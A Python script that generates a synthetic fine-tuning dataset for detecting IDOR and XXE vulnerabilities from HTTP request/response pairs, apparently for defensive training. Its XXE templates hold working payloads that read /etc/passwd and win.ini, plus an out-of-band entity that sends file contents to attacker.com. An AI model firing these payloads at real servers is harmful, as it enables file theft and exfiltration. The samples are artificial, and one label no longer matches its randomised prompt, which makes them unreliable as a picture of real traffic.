import json
import random
import os

# =============================================================================
# SYNTHETIC NLP FINE-TUNING DATASET GENERATOR for IDOR & XXE
# =============================================================================
# This script generates a high-quality JSONL dataset suitable for fine-tuning
# small LLMs (like Llama 3 8B, Mistral, or BERT-based models) to detect 
# IDOR and XXE vulnerabilities from HTTP Request/Response pairs.

DATA_DIR = r"C:\Users\awad\Downloads\SMART-HUNTER-main\SMART-HUNTER-main\Data\Datasets\Datasets_for_Model_NLP"
OUTPUT_FILE = os.path.join(DATA_DIR, "nlp_finetuning_dataset.jsonl")

# --- Benign (Normal) Examples ---
BENIGN_TEMPLATES = [
    {
        "prompt": "Analyze this HTTP request/response pair for vulnerabilities:\n\nREQUEST:\nGET /api/users/me HTTP/1.1\nHost: api.example.com\nAuthorization: Bearer <token>\n\nRESPONSE:\nHTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"id\": 105, \"username\": \"current_user\", \"email\": \"user@example.com\"}",
        "completion": "Vulnerability: None\nReasoning: The request accesses the '/me' endpoint which relies on the session token rather than user-supplied IDs. The response returns the data for the authenticated user."
    },
    {
        "prompt": "Analyze this HTTP request/response pair for vulnerabilities:\n\nREQUEST:\nPOST /api/xml/upload HTTP/1.1\nHost: test.com\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?><data><name>John</name></data>\n\nRESPONSE:\nHTTP/1.1 200 OK\n\n{\"status\": \"success\", \"message\": \"Hello John\"}",
        "completion": "Vulnerability: None\nReasoning: The request submits standard XML without any external entity (DTD) definitions. The response processes it normally."
    },
    {
        "prompt": "Analyze this HTTP request/response pair for vulnerabilities:\n\nREQUEST:\nGET /profile?user_id=105 HTTP/1.1\nHost: app.site.com\nCookie: session=xyz\n\nRESPONSE:\nHTTP/1.1 403 Forbidden\n\n{\"error\": \"Unauthorized access to user profile\"}",
        "completion": "Vulnerability: None\nReasoning: The request attempts to access user 105. The server correctly implements access control and rejects the request with a 403 Forbidden."
    }
]

# --- IDOR Examples ---
IDOR_TEMPLATES = [
    {
        "prompt": "Analyze this HTTP request/response pair for vulnerabilities:\n\nREQUEST:\nGET /api/v1/invoices/99281 HTTP/1.1\nHost: billing.corp.com\nCookie: session=attacker_session\n\nRESPONSE:\nHTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"invoice_id\": 99281, \"customer\": \"Enterprise Corp\", \"amount\": 50000.00, \"status\": \"paid\"}",
        "completion": "Vulnerability: Insecure Direct Object Reference (IDOR)\nReasoning: The request directly references an invoice ID (99281) in the URL path. The server returns a 200 OK with sensitive financial data belonging to another customer without validating if the current session owns that invoice."
    },
    {
        "prompt": "Analyze this HTTP request/response pair for vulnerabilities:\n\nREQUEST:\nPOST /account/update HTTP/1.1\nHost: shop.com\nContent-Type: application/json\nCookie: auth=123\n\n{\"user_id\": 55, \"email\": \"attacker@evil.com\"}\n\nRESPONSE:\nHTTP/1.1 200 OK\n\n{\"message\": \"Account 55 updated successfully\"}",
        "completion": "Vulnerability: Insecure Direct Object Reference (IDOR)\nReasoning: The application accepts a 'user_id' parameter in the JSON body to determine which account to update. The server processes the update (200 OK) based on this client-provided ID rather than the session context, allowing account takeover."
    },
    {
        "prompt": "Analyze this HTTP request/response pair for vulnerabilities:\n\nREQUEST:\nGET /download_receipt?uid=773&receipt_id=0091 HTTP/1.1\nHost: portal.com\n\nRESPONSE:\nHTTP/1.1 200 OK\nContent-Type: application/pdf\n\n%PDF-1.4... (Receipt for User 773)",
        "completion": "Vulnerability: Insecure Direct Object Reference (IDOR)\nReasoning: The endpoint uses a 'uid' query parameter to fetch documents. Accessing it returns a 200 OK with a PDF, indicating missing access controls on the requested user ID."
    }
]

# --- XXE Examples ---
XXE_TEMPLATES = [
    {
        "prompt": "Analyze this HTTP request/response pair for vulnerabilities:\n\nREQUEST:\nPOST /api/xml_parser HTTP/1.1\nHost: api.target.com\nContent-Type: application/xml\n\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [ <!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<foo>&xxe;</foo>\n\nRESPONSE:\nHTTP/1.1 200 OK\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
        "completion": "Vulnerability: XML External Entity (XXE) Injection\nReasoning: The request payload defines a malicious external entity (&xxe;) pointing to the local file 'file:///etc/passwd'. The response reflects the contents of the /etc/passwd file, confirming the XML parser is improperly configured and vulnerable to XXE."
    },
    {
        "prompt": "Analyze this HTTP request/response pair for vulnerabilities:\n\nREQUEST:\nPOST /upload/svg HTTP/1.1\nHost: design.com\nContent-Type: image/svg+xml\n\n<?xml version=\"1.0\" standalone=\"yes\"?>\n<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///windows/win.ini\" > ]>\n<svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\">\n<text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text>\n</svg>\n\nRESPONSE:\nHTTP/1.1 200 OK\n\nImage uploaded. Preview: ; for 16-bit app support\n[fonts]\n[extensions]\n[mci extensions]\n[files]\n[Mail]",
        "completion": "Vulnerability: XML External Entity (XXE) Injection\nReasoning: An SVG image (which is XML-based) is uploaded containing a SYSTEM entity payload requesting 'file:///windows/win.ini'. The server's response includes the contents of the win.ini file, indicating the SVG parser resolves external entities."
    },
    {
        "prompt": "Analyze this HTTP request/response pair for vulnerabilities:\n\nREQUEST:\nPOST /soap/service HTTP/1.1\nHost: enterprise.local\nContent-Type: text/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE data [ \n  <!ENTITY % file SYSTEM \"file:///etc/hostname\">\n  <!ENTITY % eval \"<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?d=%file;'>\">\n  %eval;\n  %exfiltrate;\n]>\n<soap:Envelope>...</soap:Envelope>\n\nRESPONSE:\nHTTP/1.1 500 Internal Server Error\n\njava.io.FileNotFoundException: http://attacker.com/?d=prod-db-server-01",
        "completion": "Vulnerability: XML External Entity (XXE) Injection (Out-of-Band / Error-Based)\nReasoning: The request uses parameter entities to read a local file and construct a URL to an attacker-controlled server. The error message reveals the contents of /etc/hostname ('prod-db-server-01') was successfully interpolated into the URL, confirming blind/error-based XXE."
    }
]

def generate_dataset(num_samples=500):
    dataset = []
    
    # Generate variations
    for _ in range(num_samples):
        category = random.choices(['benign', 'idor', 'xxe'], weights=[0.4, 0.3, 0.3])[0]
        
        if category == 'benign':
            template = random.choice(BENIGN_TEMPLATES)
        elif category == 'idor':
            template = random.choice(IDOR_TEMPLATES)
        else:
            template = random.choice(XXE_TEMPLATES)
            
        # We can add randomization logic here to change IDs, hostnames, etc.
        # to make the dataset more diverse for the LLM.
        prompt = template['prompt']
        prompt = prompt.replace("105", str(random.randint(1, 999)))
        prompt = prompt.replace("99281", str(random.randint(10000, 99999)))
        prompt = prompt.replace("api.example.com", f"api{random.randint(1,5)}.target.com")
        
        dataset.append({
            "messages": [
                {"role": "system", "content": "You are an expert cybersecurity AI. Analyze HTTP traffic and identify vulnerabilities like IDOR and XXE. Explain your reasoning."},
                {"role": "user", "content": prompt},
                {"role": "assistant", "content": template['completion']}
            ]
        })
        
    return dataset

if __name__ == "__main__":
    print(f"[*] Generating synthetic NLP dataset for IDOR/XXE fine-tuning...")
    data = generate_dataset(1500)
    
    os.makedirs(DATA_DIR, exist_ok=True)
    
    with open(OUTPUT_FILE, 'w') as f:
        for item in data:
            f.write(json.dumps(item) + '\n')
            
    print(f"[+] Successfully wrote {len(data)} examples to {OUTPUT_FILE}")
    print(f"[+] Dataset format: JSONL (OpenAI / HuggingFace compatible)")
